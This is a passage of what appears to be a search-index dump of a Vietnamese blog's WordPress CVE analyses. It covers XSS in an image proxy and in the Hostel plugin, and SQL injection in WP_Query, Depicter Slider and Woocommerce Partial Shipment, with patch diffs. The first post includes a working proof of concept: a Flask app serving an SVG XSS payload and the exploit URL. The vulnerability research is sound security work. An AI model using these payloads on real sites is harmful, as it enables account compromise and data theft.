s·ª≠a b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c v√† tham s·ªë $_GET['fl_asst_image_proxy'] t·ªìn t·∫°i. üëâ Khi truy c·∫≠p /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path th√¨ render_image s·∫Ω ƒë∆∞·ª£c g·ªçi v√† tr·∫£ v·ªÅ n·ªôi dung h√¨nh ·∫£nh cho tr√¨nh duy·ªát hi·ªÉn th·ªã. Exploit Detect XSS T·∫°o 1 trang web ƒë∆°n gi·∫£n tr·∫£ v·ªÅ n·ªôi dung SVG ch·ª©a XSS payload from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") G·ª≠i request ch·ª©a url param tr·ªè ƒë·∫øn https://yoursite/svg http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg üëâ Th√†nh c√¥ng v·ªõi Unauthenticated v√¨ ch·ªâ c·∫ßn ng∆∞·ªùi d√πng c√≥ quy·ªÅn, khi truy c·∫≠p url =\u003e XSS x·∫£y ra tr√™n tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n. Attacker kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p. SVG ch·ª©a XSS payload ƒë∆∞·ª£c hi·ªÉn th·ªã qua image ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS) Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e Tham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string, \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute. Diff gi·ªØa code d·ªÖ b·ªã l·ªói v√† code ƒë√£ v√° Source: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php How it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u003ca\u003e th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u003ca\u003e ph·∫£i true \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e üëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u003e 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u003e ($page_limit + $offset)). File views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include() Bi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if. ƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin. T√¨m bi·∫øn $offset trong th∆∞ m·ª•c controllers K·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['d","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra SQL Injection th√¥ng qua c√°c plugin ho·∫∑c theme s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n 5.8.3. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u003c 5.8.3 CVSS severity: High (8.0) Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress: v5.8.2(vul) Setup Required PHP Version WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress: M·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi. N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© =\u003e s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c. Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y. üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP 7.4 ƒë·ªÉ c√†i ƒë·∫∑t WordPress 5.8.2. VSCode Extensions WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh debug v√† truy v·∫øt, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code: PHP Extension Pack =\u003e t√¨m b·∫±ng t·ª´ kh√≥a: xdebug.php-pack PHP Tools for VS Code =\u003e t√¨m b·∫±ng t·ª´ kh√≥a: devsense.phptools-vscode Custom Plugin V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WordPress Core, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua plugin ho·∫∑c theme s·ª≠ d·ª•ng WP_Query, n√™n ta c·∫ßn th√¥ng qua m·ªôt plugin ho·∫∑c theme ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi WP_Query. Ta x√¢y d·ª±ng plugin s·ª≠ d·ª•ng WP_Query, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); // Display executed query echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters T·∫°o page m·ªõi v·ªõi \u003cpage-title\u003e c√≥ shortcode : [demo_wp_query] üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p http://localhost/\u003cpage-title\u003e Trang demo hi·ªÉn th·ªã k·∫øt qu·∫£ WP_Query Analysis wpdb L√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL. Cho ph√©p l·∫≠p tr√¨nh vi√™n vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥. WP_Query L√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp. L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p. M·ªëi quan h·ªá WP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL. Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc ki·ªÉm tra/validate, r·ªìi g·ªçi $wpdb ƒë·ªÉ th·ª±c thi. Patch Diff WordPress l√† m·ªôt d·ª± √°n m√£ ngu·ªìn m·ªü v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n GitHub. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn. Trong ph·∫ßn reference c·ªßa CVE-2022-21661, c√≥ li√™n k·∫øt ƒë·∫øn commit tr√™n GitHub: So s√°nh b·∫£n v√° gi·ªØa hai phi√™n b·∫£n L·ªó h·ªïng ƒë∆∞·ª£c v√° trong file src/wp-includes/class-wp-tax-query.php B·∫£n l·ªói $q","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Depicter Slider c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Depicter Slider: v3.6.1(vul) v√† v3.6.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file app/src/Controllers/Ajax/LeadsAjaxController.php index, list, export l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class LeadsAjaxController public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } C·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng Sanitize::sql thay cho Sanitize::textfield nh·∫±m ƒë·∫£m b·∫£o param 's' ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL. ·∫¢nh minh h·ªça s·ª± kh√°c bi·ªát b·∫£n v√° v√† b·∫£n l·ªói How it work? ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa textfield v√† sql ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function textfield, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class Sanitize N·∫øu b·∫°n ƒë√£ c√†i PHP Intelephense Extension trong vscode, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch Ctrl + Click v√†o h√†m c·∫ßn ƒë·∫øn. T√¨m ki·∫øm h√†m textfield trong class Sanitize textfield tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c sanitize b·∫±ng sanitize_text_field, sql c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c escape SQL public static function sql( $input ) { return esc_sql( $input ); } V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt. ƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ index, list, hay export l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class LeadsAjaxController. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n. K·∫øt qu·∫£ t√¨m ki·∫øm LeadsAjaxController trong m√£ ngu·ªìn üëâ LeadsAjaxController ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω route Ajax. Khi c√≥ request g·ª≠i t·ªõi endpoint /wp-admin/admin-ajax.php?action=action_here\u0026param1=param1_here\u0026paramN=paramN_here, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o handle('LeadsAjaxController@function') ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class LeadsAjaxController C·∫£ ba h√†m ta ƒëang focus ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c GET, nh∆∞ng export l·∫°i c√≥ middleware x·ª≠ l√Ω csrf-api, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt index v√† list Khi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m index, bi·∫øn $response ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ \\Depicter::lead()-\u003eg","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php Nh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói. Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file wc-partial-shipment/woocommerce-partial-shipment.php ƒë·ªÉ t√¨m sink. K·∫øt qu·∫£ t√¨m v·ªã tr√≠ sink trong m√£ ngu·ªìn get_shipment_id v√† get_wxp_shipment_data l√† 2 h√†m thu·ªôc class WXP_Partial_Shipment ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra. So s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° B·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u003eprepare() ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c escape ƒë√∫ng c√°ch tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection. How it work? get_shipment_id v√† get_wxp_shipment_data ƒë·ªÅu ƒë∆∞·ª£c h√†m wxp_order_set_shipped trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } üëâ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m get_shipment_id v√† get_wxp_shipment_data truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a 